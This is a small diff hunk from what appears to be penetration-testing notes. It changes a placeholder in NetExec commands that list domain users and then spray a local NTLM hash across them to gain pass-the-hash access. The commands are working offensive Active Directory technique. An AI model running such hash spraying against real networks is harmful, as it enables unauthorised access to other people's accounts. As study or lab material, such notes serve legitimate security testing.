@@ -47,7 +47,7 @@ The local NTLM hash (e.g., `operator:1000`) is often the **same hash** as a doma
 # Get all domain users
 nxc smb DC -u valid_user -H valid_hash --users | awk '{print $5}' > users.lst
 # Spray the local hash
-nxc smb DC -u users.lst -H LOCAL_NTLM_HASH --continue-on-success
+nxc smb DC -u users.lst -H <LOCAL_NTLM_HASH> --continue-on-success
 # Hit on a domain user means PtH access (e.g., simon.watson).
 ```
 
